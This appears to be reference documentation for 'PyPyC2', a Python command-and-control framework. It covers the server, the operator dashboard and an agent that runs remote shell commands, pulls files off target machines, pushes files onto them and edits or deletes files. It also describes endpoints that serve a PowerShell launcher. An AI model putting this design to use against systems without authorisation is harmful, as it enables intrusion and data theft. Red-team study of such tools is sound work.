```python
import secrets
import threading
import time
from datetime import datetime, timedelta, timezone

class PayloadTokenManager:
    def __init__(self, rotation_interval: int = 300):  # 5 minutes
        self.rotation_interval = rotation_interval
        self.current_token = self._generate_token()
        self.token_expiry = datetime.now(timezone.utc) + timedelta(seconds=rotation_interval)
        self.lock = threading.Lock()

        # Start background rotation thread
        self.rotation_thread = threading.Thread(target=self._rotation_loop, daemon=True)
        self.rotation_thread.start()

    def _generate_token(self) -> str:
        return secrets.token_urlsafe(16)  # 128-bit token

    def _rotation_loop(self):
        while True:
            time.sleep(self.rotation_interval)
            with self.lock:
                self.current_token = self._generate_token()
                self.token_expiry = datetime.now(timezone.utc) + timedelta(seconds=self.rotation_interval)

    def get_current_token(self) -> tuple[str, int]:
        with self.lock:
            expires_in = int((self.token_expiry - datetime.now(timezone.utc)).total_seconds())
            return self.current_token, expires_in

    def validate_token(self, token: str) -> bool:
        with self.lock:
            return token == self.current_token
```

---

### Frontend Architecture

**React Context** (`frontend/src/contexts/AuthContext.tsx`):
```typescript
const AuthContext = createContext<AuthContextType | undefined>(undefined)

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [token, setToken] = useState<string | null>(null)
  const [username, setUsername] = useState<string | null>(null)

  // Load from localStorage on mount
  useEffect(() => {
    const savedToken = localStorage.getItem('token')
    const savedUsername = localStorage.getItem('username')
    if (savedToken && savedUsername) {
      setToken(savedToken)
      setUsername(savedUsername)
    }
  }, [])

  const login = (token: string, username: string) => {
    setToken(token)
    setUsername(username)
    localStorage.setItem('token', token)
    localStorage.setItem('username', username)
  }

  const logout = () => {
    setToken(null)
    setUsername(null)
    localStorage.removeItem('token')
    localStorage.removeItem('username')
  }

  return (
    <AuthContext.Provider value={{ token, username, login, logout }}>
      {children}
    </AuthContext.Provider>
  )
}
```

**API Client** (`frontend/src/lib/api.ts`):
```typescript
async function apiCall<T>(endpoint: string, options: RequestInit = {}): Promise<T> {
  const token = localStorage.getItem('token')

  const response = await fetch(`${API_URL}${endpoint}`, {
    ...options,
    headers: {
      'Content-Type': 'application/json',
      ...(token && { 'Authorization': `Bearer ${token}` }),
      ...options.headers,
    },
  })

  if (response.status === 401) {
    localStorage.removeItem('token')
    window.location.href = '/login'
    throw new Error('Unauthorized')
  }

  if (!response.ok) {
    const error = await response.json()
    throw new Error(error.detail || 'Request failed')
  }

  return response.json()
}
```

---

## Function Reference

This section provides a complete reference of all functions in the PyPyC2 codebase. Functions are organized by component and include signatures, parameters, return types, and descriptions.

### Server Core Functions

#### dependencies.py

##### `get_current_user(authorization: str = Header(...))`
- **Purpose**: FastAPI dependency for authentication validation on protected routes
- **Parameters**:
  - `authorization` (str): Bearer token from Authorization header
- **Returns**: `Dict` with keys: `username`, `role`, `token`
- **Raises**: `HTTPException(401)` if token is missing, malformed, or invalid
- **Usage**: Add as dependency to protected endpoints: `user: dict = Depends(get_current_user)`

---

#### core/agent.py - Agent Class Methods

##### `__init__(self, id: int, ipaddr: str, hostname: str, user: str)`
- **Purpose**: Initialize a new agent instance
- **Parameters**:
  - `id` (int): 6-digit unique agent identifier
  - `ipaddr` (str): Client IP address
  - `hostname` (str): Target computer name
  - `user` (str): Username running the agent
- **Side Effects**: Sets default sleep_time=3, initializes empty command queue

##### `add_command(self, command_type: str, command_data: Dict[str, Any]) -> int`
- **Purpose**: Add a new command to agent's queue
- **Parameters**:
  - `command_type` (str): One of: exec, upload, download, terminate, list_directory, set_sleep_time, read_file, write_file, delete
  - `command_data` (Dict): Type-specific command parameters
- **Returns**: `int` - command_id (auto-incremented)
- **Side Effects**: Creates command with status='pending', sets created_at timestamp

##### `get_commands(self) -> List[Dict[str, Any]]`
- **Purpose**: Retrieve pending commands and mark as retrieved
- **Returns**: List of command dicts with keys: `command_id`, `type`, `data`
- **Side Effects**: Changes status from 'pending' to 'retrieved', sets retrieved_at timestamp

##### `set_result(self, command_id: int, status: str, result: Optional[str] = None, error: Optional[str] = None) -> bool`
- **Purpose**: Set the execution result for a command
- **Parameters**:
  - `command_id` (int): Command to update
  - `status` (str): 'success' or 'error'
  - `result` (Optional[str]): Command output
  - `error` (Optional[str]): Error message if failed
- **Returns**: `bool` - True if command found, False otherwise
- **Side Effects**: Sets command status to 'completed' or 'failed', sets completed_at timestamp

##### `get_result(self, command_id: int) -> Optional[Dict[str, Any]]`
- **Purpose**: Get result of a specific command
- **Parameters**: `command_id` (int): Command to query
- **Returns**: Command dict or None if not found

##### `add_uploaded_file(self, filename: str, filepath: str, size: int)`
- **Purpose**: Track a file uploaded from agent
- **Parameters**:
  - `filename` (str): Original filename
  - `filepath` (str): Path on server
  - `size` (int): File size in bytes
- **Side Effects**: Appends to agent's uploaded_files list

##### `add_downloaded_file(self, filename: str)`
- **Purpose**: Track a file downloaded by agent
- **Parameters**: `filename` (str): Name of downloaded file
- **Side Effects**: Appends to agent's downloaded_files list

##### `update_last_seen(self)`
- **Purpose**: Update agent's last contact timestamp
- **Side Effects**: Sets last_seen to current UTC time (ISO format)

##### `set_sleep_time(self, sleep_time: int)`
- **Purpose**: Update agent's polling interval
- **Parameters**: `sleep_time` (int): New interval in seconds (1-60)
- **Side Effects**: Updates agent's sleep_time attribute

##### `to_dict(self) -> Dict[str, Any]`
- **Purpose**: Serialize agent to dictionary for API responses
- **Returns**: Dict with all agent attributes including commands

---

#### core/security.py

##### `verify_password(plain_password: str, hashed_password: str) -> bool`
- **Purpose**: Verify plain password against bcrypt hash
- **Parameters**:
  - `plain_password` (str): Password to check
  - `hashed_password` (str): Bcrypt hash
- **Returns**: `bool` - True if password matches

##### `authenticate_user(username: str, password: str) -> Optional[Dict]`
- **Purpose**: Authenticate user credentials
- **Parameters**:
  - `username` (str): Username to authenticate
  - `password` (str): Plain password
- **Returns**: `Dict` with user info if successful, None otherwise
- **Note**: Currently only validates against hardcoded admin credentials

##### `generate_token() -> str`
- **Purpose**: Generate a unique session token
- **Returns**: `str` - UUID v4 token

##### `create_session(username: str) -> str`
- **Purpose**: Create new session for authenticated user
- **Parameters**: `username` (str): Authenticated username
- **Returns**: `str` - Session token (UUID)
- **Side Effects**: Stores session in global sessions dict with 8-hour timeout

##### `validate_session(token: str) -> Optional[Dict]`
- **Purpose**: Validate session token and check expiry
- **Parameters**: `token` (str): Session token to validate
- **Returns**: `Dict` with session data if valid, None otherwise
- **Side Effects**: Updates last_activity timestamp, deletes expired sessions

##### `revoke_session(token: str) -> bool`
- **Purpose**: Revoke a session (logout)
- **Parameters**: `token` (str): Session token to revoke
- **Returns**: `bool` - True if session was found and revoked
- **Side Effects**: Removes session from global sessions dict

##### `cleanup_expired_sessions() -> int`
- **Purpose**: Remove all expired sessions from storage
- **Returns**: `int` - Number of sessions removed
- **Side Effects**: Deletes expired sessions from global dict

##### `get_active_sessions_count() -> int`
- **Purpose**: Get count of currently active sessions
- **Returns**: `int` - Number of active sessions

---

#### core/token_manager.py - PayloadTokenManager Class

##### `__init__(self, rotation_interval: int = 300)`
- **Purpose**: Initialize token manager with background rotation
- **Parameters**: `rotation_interval` (int): Seconds between rotations (default 300 = 5min)
- **Side Effects**: Starts daemon thread for automatic token rotation

##### `_generate_token(self) -> str` (private)
- **Purpose**: Generate cryptographically secure random token
- **Returns**: `str` - URL-safe token (128-bit)
- **Implementation**: Uses `secrets.token_urlsafe(16)`

##### `_rotate_token(self)` (private)
- **Purpose**: Rotate the current token
- **Side Effects**: Generates new token, updates expiry timestamp

##### `_rotation_worker(self)` (private)
- **Purpose**: Background thread worker for automatic rotation
- **Runs**: Infinite loop, sleeps rotation_interval seconds between rotations

##### `get_current_token(self) -> str`
- **Purpose**: Get the current valid token
- **Returns**: `str` - Current token
- **Thread-safe**: Uses lock for safe concurrent access

##### `get_time_until_expiry(self) -> int`
- **Purpose**: Get seconds until current token expires
- **Returns**: `int` - Seconds remaining

##### `validate_token(self, token: str) -> bool`
- **Purpose**: Check if provided token matches current valid token
- **Parameters**: `token` (str): Token to validate
- **Returns**: `bool` - True if valid
- **Thread-safe**: Uses lock

---

### Server Router Functions

#### routers/auth.py

##### `login(credentials: LoginRequest) -> LoginResponse`
- **Endpoint**: `POST /auth/login`
- **Purpose**: Authenticate user and create session
- **Parameters**: `credentials` - Pydantic model with username, password
- **Returns**: LoginResponse with token, username, role, message
- **Raises**: `HTTPException(401)` if invalid credentials

##### `logout(authorization: str = Header(...)) -> LogoutResponse`
- **Endpoint**: `POST /auth/logout`
- **Purpose**: Logout user and revoke session
- **Parameters**: `authorization` (str): Bearer token from header
- **Returns**: LogoutResponse with status and message
- **Raises**: `HTTPException(401)` if invalid header format

##### `verify_token(authorization: str = Header(...)) -> VerifyResponse`
- **Endpoint**: `GET /auth/verify`
- **Purpose**: Verify if token is valid and active
- **Parameters**: `authorization` (str): Bearer token from header
- **Returns**: VerifyResponse with authentication status and user info

---

#### routers/agents.py

##### `get_agents(user: Dict = Depends(get_current_user)) -> List[Dict]`
- **Endpoint**: `GET /agents`
- **Purpose**: Get list of all agents
- **Returns**: List of agent dictionaries
- **Auth**: Requires valid bearer token

##### `get_agent(agent_id: int, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `GET /agent/{agent_id}`
- **Purpose**: Get detailed info about specific agent
- **Parameters**: `agent_id` (int): Agent identifier
- **Returns**: Dict with agent details including full command history
- **Raises**: `HTTPException(404)` if agent not found

##### `delete_agent(agent_id: int, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `DELETE /agent/{agent_id}`
- **Purpose**: Delete agent and all associated files
- **Parameters**: `agent_id` (int): Agent to delete
- **Returns**: Dict with status, message, terminated flag
- **Side Effects**: Sends terminate command if online, deletes upload directory
- **Raises**: `HTTPException(404)` if agent not found

---

#### routers/commands.py

##### `create_exec_command(agent_id: int, command: str, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `POST /create_command/{agent_id}` (legacy)
- **Purpose**: Create exec command
- **Parameters**:
  - `agent_id` (int): Target agent
  - `command` (str): Shell command to execute
- **Returns**: Dict with command_id and type
- **Raises**: `HTTPException(404)` if agent not found

##### `create_exec_command_v2(agent_id: int, command: str, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `POST /command/{agent_id}/exec`
- **Purpose**: Create exec command (v2 endpoint)
- **Parameters**: Same as above
- **Returns**: Dict with command_id, type, status

##### `create_upload_command(agent_id: int, source_path: str, filename: str, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `POST /command/{agent_id}/upload`
- **Purpose**: Command agent to upload file to server
- **Parameters**:
  - `agent_id` (int): Target agent
  - `source_path` (str): Path on target machine
  - `filename` (str): Name to save as on server
- **Returns**: Dict with command_id, type, status, message

##### `create_download_command(agent_id: int, filename: str, save_as: str, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `POST /command/{agent_id}/download`
- **Purpose**: Command agent to download file from server
- **Parameters**:
  - `agent_id` (int): Target agent
  - `filename` (str): File in agent's server directory
  - `save_as` (str): Path to save on target machine
- **Returns**: Dict with command_id, type, status, message, url
- **Raises**: `HTTPException(404)` if agent or file not found

##### `create_terminate_command(agent_id: int, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `POST /command/{agent_id}/terminate`
- **Purpose**: Command agent to gracefully shutdown
- **Parameters**: `agent_id` (int): Target agent
- **Returns**: Dict with command_id, type, status, message

##### `create_list_directory_command(agent_id: int, path: str, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `POST /command/{agent_id}/list_directory`
- **Purpose**: Command agent to list directory contents
- **Parameters**:
  - `agent_id` (int): Target agent
  - `path` (str): Directory path to list
- **Returns**: Dict with command_id, type, status, message

##### `create_set_sleep_time_command(agent_id: int, sleep_time: int, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `POST /command/{agent_id}/set_sleep_time`
- **Purpose**: Change agent's polling interval
- **Parameters**:
  - `agent_id` (int): Target agent
  - `sleep_time` (int): New interval in seconds (1-60)
- **Returns**: Dict with command_id, type, status, message
- **Raises**: `HTTPException(400)` if sleep_time out of range

##### `create_read_file_command(agent_id: int, path: str, max_size: int = 10485760, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `POST /command/{agent_id}/read_file`
- **Purpose**: Command agent to read file content
- **Parameters**:
  - `agent_id` (int): Target agent
  - `path` (str): File path to read
  - `max_size` (int): Maximum file size (default 10MB)
- **Returns**: Dict with command_id, type, status, message

##### `create_write_file_command(agent_id: int, request: WriteFileRequest, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `POST /command/{agent_id}/write_file`
- **Purpose**: Command agent to write content to file
- **Parameters**:
  - `agent_id` (int): Target agent
  - `request` (WriteFileRequest): Contains path and content
- **Returns**: Dict with command_id, type, status, message

##### `create_delete_command(agent_id: int, path: str, recursive: bool = False, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `POST /command/{agent_id}/delete`
- **Purpose**: Command agent to delete file or directory
- **Parameters**:
  - `agent_id` (int): Target agent
  - `path` (str): Path to delete
  - `recursive` (bool): If True, delete directories recursively
- **Returns**: Dict with command_id, type, status, message

##### `get_command_result(agent_id: int, command_id: int, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `GET /command/{agent_id}/{command_id}`
- **Purpose**: Get result of a specific command
- **Parameters**:
  - `agent_id` (int): Agent identifier
  - `command_id` (int): Command identifier
- **Returns**: Dict with status, result, error
- **Raises**: `HTTPException(404)` if agent or command not found

---

#### routers/agent_comms.py

##### `create_agent(agentintial: AgentIntial, request: Request) -> Dict`
- **Endpoint**: `POST /join`
- **Purpose**: Register new agent with C2 server
- **Parameters**:
  - `agentintial` (AgentIntial): Pydantic model with hostname, user
  - `request` (Request): FastAPI request object (for IP extraction)
- **Returns**: Dict with id (6-digit) and status
- **Side Effects**: Creates agent, stores in global agents dict
- **Raises**: `HTTPException(500)` if failed to generate unique ID after 100 attempts

##### `get_commands(agent_id: int) -> Dict`
- **Endpoint**: `GET /agent/get_commands/{agent_id}`
- **Purpose**: Agent polls for pending commands
- **Parameters**: `agent_id` (int): Agent identifier
- **Returns**: Dict with commands list
- **Side Effects**: Marks commands as retrieved, updates last_seen
- **Raises**: `HTTPException(404)` if agent not found
- **Note**: No authentication required (agents can't authenticate)

##### `set_commands(commands: Commands) -> Dict` (deprecated)
- **Endpoint**: `POST /agent/set_commands`
- **Purpose**: Legacy endpoint for backward compatibility
- **Note**: Deprecated, use set_command_result instead

##### `set_command_result(command: CommandResult) -> Dict`
- **Endpoint**: `POST /agent/set_command_result`
- **Purpose**: Agent reports command execution result
- **Parameters**: `command` (CommandResult): Pydantic model with agent_id, command_id, status, result, error
- **Returns**: Dict with status and message
- **Side Effects**: Updates command status and result
- **Raises**: `HTTPException(404)` if agent or command not found

##### `agent_upload_file(agent_id: int, file: UploadFile) -> Dict`
- **Endpoint**: `POST /agent/upload_file`
- **Purpose**: Agent uploads file to server
- **Parameters**:
  - `agent_id` (int): Agent identifier
  - `file` (UploadFile): Multipart file upload
- **Returns**: Dict with status, filename, size
- **Side Effects**: Saves file to uploads/agent_{id}/, tracks in agent's uploaded_files
- **Raises**:
  - `HTTPException(404)` if agent not found
  - `HTTPException(413)` if file exceeds 100MB limit

---

#### routers/files.py

##### `serve_file(agent_dir: str, filename: str) -> FileResponse`
- **Endpoint**: `GET /files/{agent_dir}/{filename}`
- **Purpose**: Serve file for agent download
- **Parameters**:
  - `agent_dir` (str): Directory name (e.g., "agent_123456")
  - `filename` (str): File to serve
- **Returns**: FileResponse with file content
- **Raises**: `HTTPException(404)` if file not found
- **Note**: No authentication (agents need access)

##### `list_agent_files(agent_id: int, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `GET /files/{agent_id}`
- **Purpose**: List files available for an agent
- **Parameters**: `agent_id` (int): Agent identifier
- **Returns**: Dict with files list (filename, size)
- **Raises**: `HTTPException(404)` if agent directory doesn't exist

##### `dashboard_download_file(agent_id: int, filename: str, user: Dict = Depends(get_current_user)) -> FileResponse`
- **Endpoint**: `GET /dashboard/files/{agent_id}/{filename}`
- **Purpose**: Protected download for dashboard users
- **Parameters**:
  - `agent_id` (int): Agent identifier
  - `filename` (str): File to download
- **Returns**: FileResponse with file content
- **Raises**: `HTTPException(404)` if agent or file not found

##### `upload_file_for_agent(agent_id: int, file: UploadFile, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `POST /upload_for_agent/{agent_id}`
- **Purpose**: Operator uploads file that agent can download later
- **Parameters**:
  - `agent_id` (int): Target agent
  - `file` (UploadFile): Multipart file upload
- **Returns**: Dict with status, filename, size, message, download_url
- **Side Effects**: Saves file to uploads/agent_{id}/
- **Raises**:
  - `HTTPException(404)` if agent not found
  - `HTTPException(413)` if file exceeds 100MB limit

##### `delete_file(agent_id: int, filename: str, user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `DELETE /dashboard/files/{agent_id}/{filename}`
- **Purpose**: Delete file from server storage
- **Parameters**:
  - `agent_id` (int): Agent identifier
  - `filename` (str): File to delete
- **Returns**: Dict with message
- **Side Effects**: Permanently deletes file from filesystem
- **Raises**: `HTTPException(404)` if file not found

---

#### routers/payloads.py

##### `get_payload_token(user: Dict = Depends(get_current_user)) -> Dict`
- **Endpoint**: `GET /api/payload-token`
- **Purpose**: Get current valid payload token and expiry time
- **Returns**: Dict with token, expires_in, lifetime
- **Auth**: Requires valid bearer token

##### `get_launcher_script(request: Request, id: str = Query(...)) -> Response`
- **Endpoint**: `GET /payload/launcher.ps1?id={token}`
- **Purpose**: Serve PowerShell launcher script
- **Parameters**: `id` (str): Payload token (query param)
- **Returns**: Response with PowerShell script (server URL injected)
- **Raises**: `HTTPException(404)` if invalid token or template not found
- **Note**: Template replaces {{SERVER_URL}} placeholder

##### `get_agent_payload() -> FileResponse`
- **Endpoint**: `GET /payload/allinone.py`
- **Purpose**: Serve agent Python file for deployment
- **Returns**: FileResponse with allinone.py
- **Raises**: `HTTPException(404)` if file not found
- **Note**: No authentication (security risk)

---

### Agent Functions

#### Agent/main.py & Agent/allinone.py

##### `encode_multipart_formdata(fields: Dict, files: Dict) -> Tuple[str, bytes]`
- **Purpose**: Encode data for multipart/form-data uploads (RFC 2388 compliant)
- **Parameters**:
  - `fields` (Dict): Form field name→value pairs
  - `files` (Dict): File field name→(filename, content) pairs
- **Returns**: Tuple of (content_type, body)
- **Note**: Used in allinone.py for file uploads without requests library

##### `execute_command(command: str) -> str`
- **Purpose**: Execute shell command with persistent directory state
- **Parameters**: `command` (str): Shell command to run
- **Returns**: `str` - Command output (stdout + stderr)
- **Special Behavior**:
  - `cd` commands update global CWD variable instead of executing
  - All commands run in current CWD
  - Uses PowerShell on Windows

##### `get_hostname() -> str`
- **Purpose**: Get computer hostname
- **Returns**: `str` - Hostname from COMPUTERNAME or HOSTNAME env var

##### `get_whoami() -> str`
- **Purpose**: Get current username
- **Returns**: `str` - Username from USERNAME or USER env var

##### `list_directory(path: str) -> str`
- **Purpose**: List directory contents with metadata
- **Parameters**: `path` (str): Directory path to list
- **Returns**: `str` - JSON string with items array or error
- **Output Format**:
```json
{
  "status": "success",
  "items": [{"name": "...", "is_directory": true/false, "size": 0, "path": "..."}]
}
```

##### `connect() -> Optional[int]`
- **Purpose**: Send join request to C2 server
- **Returns**: `int` - Agent ID if successful, None otherwise
- **Side Effects**: Sets global AGENT_ID variable
- **Network**: POST to /join with hostname and username

##### `check_commands() -> List[Dict]`
- **Purpose**: Poll server for pending commands
- **Returns**: List of command dictionaries
- **Network**: GET /agent/get_commands/{AGENT_ID}

##### `execute_exec_command(command_data: Dict) -> Dict`
- **Purpose**: Execute shell command
- **Parameters**: `command_data` (Dict): Contains 'command' key
- **Returns**: Dict with status and result/error

##### `execute_upload_command(command_data: Dict) -> Dict`
- **Purpose**: Upload file from agent to server
- **Parameters**: `command_data` (Dict): Contains 'source_path' and 'filename'
- **Returns**: Dict with status and result/error
- **Network**: POST multipart/form-data to /agent/upload_file

##### `execute_download_command(command_data: Dict) -> Dict`
- **Purpose**: Download file from server to agent
- **Parameters**: `command_data` (Dict): Contains 'url' and 'save_as'
- **Returns**: Dict with status and result/error
- **Network**: GET from provided URL

##### `execute_terminate_command() -> Dict`
- **Purpose**: Terminate agent gracefully
- **Returns**: Dict with status, result, and terminate=True flag
- **Effect**: Causes main loop to exit

##### `execute_list_directory_command(command_data: Dict) -> Dict`
- **Purpose**: List directory contents
- **Parameters**: `command_data` (Dict): Contains 'path'
- **Returns**: Dict with status and result (JSON directory listing)

##### `execute_set_sleep_time_command(command_data: Dict) -> Dict`
- **Purpose**: Change agent polling interval
- **Parameters**: `command_data` (Dict): Contains 'sleep_time' (1-60)
- **Returns**: Dict with status and result/error
- **Side Effects**: Updates global SLEEP_TIME variable

##### `execute_read_file_command(command_data: Dict) -> Dict`
- **Purpose**: Read file content for editing
- **Parameters**: `command_data` (Dict): Contains 'path' and optional 'max_size'
- **Returns**: Dict with status and result containing:
  - `content` (str): File contents
  - `encoding` (str): Detected encoding
  - `size` (int): File size
- **Encoding Detection**: Tries utf-8, latin-1, cp1252, utf-16
- **Binary Detection**: Returns error for binary files

##### `execute_write_file_command(command_data: Dict) -> Dict`
- **Purpose**: Write content to file
- **Parameters**: `command_data` (Dict): Contains 'path' and 'content'
- **Returns**: Dict with status and result/error
- **Safety Features**:
  - Creates .bak backup before writing
  - Atomic write (temp file + rename)
  - Rollback on failure
  - Creates parent directories

##### `execute_delete_command(command_data: Dict) -> Dict`
- **Purpose**: Delete file or directory
- **Parameters**: `command_data` (Dict): Contains 'path' and 'recursive'
- **Returns**: Dict with status and result/error
- **Behavior**:
  - Files: Direct deletion
  - Directories (recursive=False): Error if not empty
  - Directories (recursive=True): Full tree deletion

##### `execute_command_by_type(command: Dict) -> Dict`
- **Purpose**: Route command to appropriate handler based on type
- **Parameters**: `command` (Dict): Contains 'type' and 'data'
- **Returns**: Dict with command result
- **Supported Types**: exec, upload, download, terminate, list_directory, set_sleep_time, read_file, write_file, delete

##### `send_result(command_id: int, result: Dict)`
- **Purpose**: Send command execution result to server
- **Parameters**:
  - `command_id` (int): Command identifier
  - `result` (Dict): Execution result
- **Network**: POST to /agent/set_command_result

##### `main()`
- **Purpose**: Main agent loop - connect, poll, execute commands
- **Flow**:
  1. Get server URL from argv
  2. Connect to server (get agent ID)
  3. Enter polling loop:
     - Sleep for SLEEP_TIME seconds
     - Check for commands
     - Execute each command
     - Send results
     - Check for terminate flag
  4. Exit on terminate

---

### Frontend Functions

#### frontend/src/lib/api.ts

##### `getAuthToken() -> string | null`
- **Purpose**: Get authentication token from localStorage
- **Returns**: Token string or null if not found

##### `apiCall<T>(endpoint: string, options?: RequestInit) -> Promise<T>`
- **Purpose**: Generic API call wrapper with authentication
- **Parameters**:
  - `endpoint` (string): API path (e.g., "/agents")
  - `options` (RequestInit): Fetch options
- **Returns**: Promise with typed response
- **Features**:
  - Auto-adds Authorization header with bearer token
  - Handles 401 by redirecting to login
  - Parses error responses

##### `getAgents() -> Promise<Agent[]>`
- **Endpoint**: `GET /agents`
- **Purpose**: Fetch list of all agents
- **Returns**: Promise with array of Agent objects

##### `getAgent(agentId: number) -> Promise<AgentDetailed>`
- **Endpoint**: `GET /agent/{agentId}`
- **Purpose**: Fetch detailed agent information
- **Returns**: Promise with AgentDetailed object (includes full command history)

##### `deleteAgent(agentId: number) -> Promise<{status: boolean, message: string, terminated: boolean}>`
- **Endpoint**: `DELETE /agent/{agentId}`
- **Purpose**: Delete agent from server
- **Returns**: Promise with deletion status

##### `terminateAgent(agentId: number) -> Promise<any>`
- **Endpoint**: `POST /command/{agentId}/terminate`
- **Purpose**: Send terminate command to agent
- **Returns**: Promise with command creation response

##### `executeCommand(agentId: number, command: string) -> Promise<any>`
- **Endpoint**: `POST /command/{agentId}/exec`
- **Purpose**: Execute shell command on agent
- **Returns**: Promise with command creation response

##### `createUploadCommand(agentId: number, sourcePath: string, filename?: string) -> Promise<any>`
- **Endpoint**: `POST /command/{agentId}/upload`
- **Purpose**: Create upload command (agent → server)
- **Returns**: Promise with command creation response

##### `createDownloadCommand(agentId: number, filename: string, saveAs?: string) -> Promise<any>`
- **Endpoint**: `POST /command/{agentId}/download`
- **Purpose**: Create download command (server → agent)
- **Returns**: Promise with command creation response

##### `setSleepTime(agentId: number, sleepTime: number) -> Promise<any>`
- **Endpoint**: `POST /command/{agentId}/set_sleep_time`
- **Purpose**: Change agent polling interval
- **Returns**: Promise with command creation response

##### `listDirectory(agentId: number, path: string, agentSleepTime: number = 3) -> Promise<DirectoryItem[]>`
- **Endpoint**: `POST /command/{agentId}/list_directory` + polling
- **Purpose**: List directory contents with smart polling
- **Parameters**:
  - `agentId` (number): Target agent
  - `path` (string): Directory to list
  - `agentSleepTime` (number): Agent's sleep time for timeout calculation
- **Returns**: Promise with array of directory items
- **Polling**: Polls every 500ms, calculates max attempts from sleep time
- **Timeout**: `(agentSleepTime * 3 + 10) seconds`

##### `getCommandResult(agentId: number, commandId: number) -> Promise<CommandResult>`
- **Endpoint**: `GET /command/{agentId}/{commandId}`
- **Purpose**: Get result of specific command
- **Returns**: Promise with CommandResult object

##### `listAgentFiles(agentId: number) -> Promise<{files: FileInfo[]}>`
- **Endpoint**: `GET /files/{agentId}`
- **Purpose**: List files in agent's server directory
- **Returns**: Promise with files array

##### `uploadFileForAgent(agentId: number, file: File) -> Promise<any>`
- **Endpoint**: `POST /upload_for_agent/{agentId}`
- **Purpose**: Upload file from operator's PC to server for agent
- **Returns**: Promise with upload response

##### `downloadFile(agentDir: string, filename: string) -> Promise<Blob>`
- **Endpoint**: `GET /files/{agentDir}/{filename}`
- **Purpose**: Download file from server to operator's PC
- **Returns**: Promise with file blob

##### `getAgentStatus(lastSeen: string, sleepTime: number = 3) -> 'online' | 'offline'`
- **Purpose**: Determine if agent is online or offline
- **Parameters**:
  - `lastSeen` (string): ISO timestamp of last contact
  - `sleepTime` (number): Agent's polling interval
- **Returns**: 'online' or 'offline'
- **Algorithm**: `(now - lastSeen) < (sleepTime * 2 + 5)`

##### `formatBytes(bytes: number) -> string`
- **Purpose**: Format byte size to human-readable string
- **Parameters**: `bytes` (number): Size in bytes
- **Returns**: Formatted string (e.g., "1.5 MB", "3.2 KB")

##### `formatDate(dateString: string) -> string`
- **Purpose**: Format ISO date string to locale string
- **Parameters**: `dateString` (string): ISO 8601 timestamp
- **Returns**: Localized date/time string

##### `getPayloadToken() -> Promise<{token: string, expires_in: number, lifetime: number}>`
- **Endpoint**: `GET /api/payload-token`
- **Purpose**: Get current payload token and expiry
- **Returns**: Promise with token info

##### `readFile(agentId: number, path: string, agentSleepTime: number = 3) -> Promise<{content: string, encoding: string, size: number}>`
- **Endpoint**: `POST /command/{agentId}/read_file` + polling
- **Purpose**: Read file content with smart polling
- **Returns**: Promise with file content, encoding, and size
- **Polling**: Same pattern as listDirectory

##### `writeFile(agentId: number, path: string, content: string, agentSleepTime: number = 3) -> Promise<string>`
- **Endpoint**: `POST /command/{agentId}/write_file` + polling
- **Purpose**: Write content to file with smart polling
- **Returns**: Promise with result message
- **Polling**: Same pattern as listDirectory

##### `deleteFile(agentId: number, path: string, recursive: boolean = false, agentSleepTime: number = 3) -> Promise<string>`
- **Endpoint**: `POST /command/{agentId}/delete` + polling
- **Purpose**: Delete file or directory with smart polling
- **Returns**: Promise with result message
- **Polling**: Same pattern as listDirectory

##### `requestFileFromAgent(agentId: number, sourcePath: string, filename?: string, agentSleepTime: number = 3) -> Promise<string>`
- **Endpoint**: `POST /command/{agentId}/upload` + polling
- **Purpose**: Request agent to upload file with smart polling
- **Returns**: Promise with result message
- **Polling**: Same pattern as listDirectory

##### `downloadFileToAgent(agentId: number, filename: string, saveAs: string, agentSleepTime: number = 3) -> Promise<string>`
- **Endpoint**: `POST /command/{agentId}/download` + polling
- **Purpose**: Push file from server to agent with smart polling
- **Returns**: Promise with result message
- **Polling**: Same pattern as listDirectory

---

#### frontend/src/contexts/AuthContext.tsx

##### `login(username: string, password: string) -> Promise<void>`
- **Purpose**: Authenticate user and store credentials
- **Parameters**:
  - `username` (string): User's username
  - `password` (string): User's password
- **Side Effects**:
  - Calls /auth/login endpoint
  - Stores token and username in localStorage
  - Updates context state
- **Throws**: Error if authentication fails

##### `logout() -> Promise<void>`
- **Purpose**: Logout user and clear session
- **Side Effects**:
  - Calls /auth/logout endpoint
  - Removes token and username from localStorage
  - Clears context state
  - Redirects to login page

##### `useAuth() -> AuthContextType`
- **Purpose**: Hook to access AuthContext
- **Returns**: AuthContextType with token, username, login, logout methods
- **Throws**: Error if used outside AuthProvider

---

## Summary

This reference documents **118 functions** across the PyPyC2 codebase:

- **Server Core**: 36 functions (Agent class, security, token management, dependencies)
- **Server Routers**: 36 functions (28 API endpoints)
- **Agent**: 19 functions (command execution, communication)
- **Frontend**: 27 functions (API client, authentication, utilities)

All functions are organized by file/module for easy reference. Each entry includes purpose, parameters, return types, side effects, and relevant notes about behavior or security implications.

---

## Security Analysis

### Authentication & Authorization

#### Strengths
✅ **Password Hashing**: Uses bcrypt (industry standard)
✅ **Session Timeout**: 8-hour expiry prevents infinite sessions
✅ **Bearer Tokens**: Standard authorization pattern
✅ **Token Validation**: Checked on every protected request

#### Weaknesses
❌ **Hardcoded Credentials**: Password in source code
❌ **No Password Change**: Cannot update admin password
❌ **No Multi-User**: Only one admin account
❌ **No Role-Based Access**: All authenticated users have full access
❌ **Predictable Tokens**: UUID v4 (good but not as secure as signed JWTs)

---

### Network Security

#### Critical Gaps
❌ **No TLS/HTTPS**: ALL traffic is **plaintext HTTP**
- Admin credentials transmitted unencrypted
- Bearer tokens visible on network
- All commands and results visible
- File contents exposed
- **MITM attacks trivial**

